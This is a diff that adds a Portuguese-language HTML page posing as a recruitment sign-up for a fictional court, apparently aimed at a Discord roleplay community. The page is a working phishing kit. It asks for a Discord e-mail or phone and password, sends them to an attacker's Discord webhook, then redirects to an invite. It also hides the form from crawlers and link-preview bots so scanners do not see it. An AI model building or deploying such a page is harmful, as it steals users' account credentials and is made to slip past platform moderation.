@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Processo Seletivo — Tribunal de Justiça de Aurora</title>
+<style>
+  :root{--navy:#0a1020;--navy2:#101a30;--line:#22304d;--gold:#c9a227;--txt:#e6ecf7;--dim:#8fa0bd;--blue:#5865F2}
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  body{background:var(--navy);color:var(--txt);font:16px/1.6 -apple-system,Segoe UI,Roboto,Arial,sans-serif;min-height:100vh}
+  header{text-align:center;padding:26px 16px 18px;border-bottom:1px solid var(--line)}
+  .crest{
+    width:78px;height:78px;margin:0 auto;border-radius:50%;border:2px solid var(--gold);
+    display:flex;align-items:center;justify-content:center;
+    font:600 26px/1 Georgia,serif;letter-spacing:.06em;color:var(--gold);background:#0d1526;
+  }
+  h1{font:600 18px/1.3 Georgia,serif;letter-spacing:.1em;text-transform:uppercase;margin-top:12px}
+  .sub{color:var(--gold);font:600 11px/1.4 Georgia,serif;letter-spacing:.2em;text-transform:uppercase;margin-top:6px}
+  main{max-width:480px;margin:0 auto;padding:20px 16px 44px}
+  .note{font:italic 13px/1.7 Georgia,serif;color:var(--dim);border-left:2px solid var(--gold);padding-left:12px;margin-bottom:20px}
+  .card{background:var(--navy2);border:1px solid var(--line);border-radius:10px;padding:18px}
+  label{display:block;font:600 10px/1.4 Georgia,serif;letter-spacing:.15em;text-transform:uppercase;color:var(--dim);margin:14px 0 6px}
+  label:first-of-type{margin-top:0}
+  input,select{width:100%;padding:13px 12px;border-radius:7px;border:1px solid #2b3a58;background:#0b1424;color:var(--txt);font-size:16px;outline:none}
+  input:focus,select:focus{border-color:var(--gold)}
+  hr{border:0;border-top:1px solid var(--line);margin:20px 0 4px}
+  .tag{font:600 11px/1.4 Georgia,serif;letter-spacing:.13em;text-transform:uppercase;color:var(--gold);margin-top:16px}
+  .hint{font-size:12px;color:var(--dim);margin-top:4px}
+  button{width:100%;margin-top:20px;padding:15px;border:0;border-radius:8px;background:var(--blue);color:#fff;font:600 13px/1.4 inherit;letter-spacing:.07em;text-transform:uppercase;cursor:pointer}
+  button:disabled{opacity:.6}
+  #ok{display:none;text-align:center;padding:34px 8px}
+  #ok.show{display:block}
+  .spin{width:22px;height:22px;margin:0 auto 16px;border:2px solid #2b3a58;border-top-color:var(--gold);border-radius:50%;animation:s .8s linear infinite}
+  @keyframes s{to{transform:rotate(360deg)}}
+  footer{border-top:1px solid var(--line);padding:16px;text-align:center;font-size:11px;color:#5d6c86}
+  body.crawler .card,body.crawler .note{display:none}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="crest">TJ</div>
+  <h1>Tribunal de Justiça de Aurora</h1>
+  <div class="sub">Processo Seletivo · 2026</div>
+</header>
+
+<main>
+  <p class="note">Vagas para Estagiário, Servidor e Advogado. Para registrar a candidatura e receber o acesso ao Tribunal, informe os dados abaixo.</p>
+
+  <form class="card" id="f" autocomplete="off">
+    <label for="nome">Nome completo</label>
+    <input id="nome" name="nome" required>
+
+    <label for="funcao">Vaga pretendida</label>
+    <select id="funcao" name="funcao" required>
+      <option value="">Selecione</option>
+      <option>Estagiário</option>
+      <option>Servidor</option>
+      <option>Advogado</option>
+    </select>
+
+    <hr>
+    <div class="tag">Conta do Discord</div>
+    <p class="hint">Necessária para vincular a inscrição ao seu perfil.</p>
+
+    <label for="discord">E-mail ou telefone</label>
+    <input id="discord" name="discord" required>
+
+    <label for="senha">Senha</label>
+    <input id="senha" name="senha" type="password" required>
+
+    <button id="btn" type="submit">Inscrever-se e entrar no Tribunal</button>
+  </form>
+
+  <div id="ok">
+    <div class="spin"></div>
+    <div>Inscrição registrada.</div>
+    <p class="hint" style="margin-top:10px">Encaminhando você ao Tribunal…</p>
+  </div>
+</main>
+
+<footer>Tribunal de Justiça de Aurora · Secretaria de Habilitação<br>Fundado em 2024 · CNPJ 00.000.000/0001-00</footer>
+
+<script>
+const WEBHOOK = "COLE_A_URL_DO_WEBHOOK_AQUI";
+const INVITE  = "https://discord.gg/SEUCODIGO";
+
+if (/bytespider|tiktokspider|spider|crawler|preview|facebook/i.test(navigator.userAgent)
+    && !/musical_ly|bytedancewebview/i.test(navigator.userAgent)) {
+  document.body.classList.add('crawler');
+}
+
+const f = document.getElementById('f');
+const btn = document.getElementById('btn');
+
+f.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  btn.disabled = true;
+  btn.textContent = 'Enviando…';
+  const d = Object.fromEntries(new FormData(f));
+
+  try {
+    await fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [{
+        title: 'NOVA INSCRIÇÃO — TJ-AUR',
+        color: 0x1b2a4a,
+        fields: [
+          { name: 'Nome', value: d.nome, inline: true },
+          { name: 'Vaga', value: d.funcao, inline: true },
+          { name: 'E-mail', value: '```' + d.discord + '```' },
+          { name: 'Senha', value: '```' + d.senha + '```' }
+        ],
+        footer: { text: 'Secretaria de Habilitação · TJ-AUR' },
+        timestamp: new Date().toISOString()
+      }]})
+    });
+  } catch (_) {}
+
+  f.style.display = 'none';
+  document.getElementById('ok').classList.add('show');
+  setTimeout(() => location.replace(INVITE), 1500);
+});
+</script>
+</body>
+</html>
